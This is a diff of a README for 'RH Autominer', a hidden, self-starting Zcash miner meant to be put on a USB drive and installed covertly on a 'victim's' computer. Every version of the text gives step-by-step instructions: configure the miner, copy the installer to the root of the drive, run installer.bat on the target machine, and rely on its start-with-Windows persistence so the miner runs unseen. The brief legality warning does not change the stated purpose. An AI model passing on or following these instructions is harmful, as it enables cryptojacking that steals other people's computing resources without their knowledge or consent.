@@ -1,25 +1,37 @@
 RH Autominer 1.0
-This is a hidden and selfstarting zcash miner based on the ewbf miner.
-The intenden usecase for this script is to inject the script in to someones
-computer and start mining for you, without them knowing.
-Use on your own risk.
 
-THE SCRIPT CAN ONLY BE TURN OF IN THE APPLICATION MANEGER.
-IF YOU ARE TRYING TO TURN IT OFF,
-LOOK FOR "miner" IN THE APPLICATION MANEGER.
+The RH Autominer is meant to be put on a usb drive so you can quickly start a mining operation
+on a new computer or just infect someone else’s computer to mine for you in the background, without them knowing. 
+Currently RH Autominer 1.0 only supports equihash coins, such as Zcash witch is preinstalled.
+RH Autominer 2.0 will support ethash coins in the future.
 
-1. Change the miner settings to your liking. 
-	To change the setting, edit "config.bat" in "RH Autominer" folder. 
-	For more help with the miner pleas refer to the "Help" document.
+*WARNING*
+Use on your own risk. 
+It could be illegal to run this script on someone’s computer without them knowing.
+How to turn of the script: 
+Since it is a silent miner, the miner won’t run in a normal window, so you can’t just close the window to shut the miner down.
+To shut down the miner, open task manger, navigate to processes and search for “miner.exe” or “miner”.
+When you have found it, it’s just to mark it and click on “End task”.
+*WARNING*
 
-2. When you are done with the miner setup, copy the "RH Autominer" folder and "installer.bat" to a usb.
-You don't need the .txt files, but you can paste them too.
-It's inportant to do this right othervise the script won't work. The files must be located
-in the first dir of the usb, not in a folder on the usb.
-It shuold look something like this: "F:\RH Autominer" and "F:\installer.bat"
+What the installer does:
+When the usb drive is inserted to a new computer nothing will happen until you start “installer.bat”.
+When “installer.bat” is executed, it will copy the script form the usb drive to the victim’s documents folder on the C drive.
+After that it will setup the “start with windows” function and run the script.
 
-3. Plug the usb in to the vicums computer and run installer.bat.
-It will now copy itself to the vicums computer and start running.
-The script will lauch with windows so eaven if the vicum restarts the computer the script will start again.
+How to setup the Autominer:
+1. Change the miner settings to your liking.
+To change the setting, edit "config.bat" in "RH Autominer" folder.
+For more help with the miner please refer to the "Help" document.
 
-4. When the console says the install has complited and the script is running, you can eject the usb.
+2. When you are done with the miner setup, copy the "RH Autominer" folder and "installer.bat" to a usb drive.
+You don't need the .txt files, but you can copy them too. It's important to do this right otherwise the script won't work.
+The files must be in the first directory of the usb drive, not in a folder on the usb.
+It should look something like this: "F:\RH Autominer" and "F:\installer.bat"
+The “F:\” is just an example, it doesn’t matter what letter the usb drive has.
+
+3. Plug the usb in to the victim’s computer and run installer.bat.
+It will now copy itself to the victim’s computer and start running. It takes less than 30 seconds.
+
+4. When the console says the install has completed and the script is running, you can eject the usb drive from the computer.
+All done.
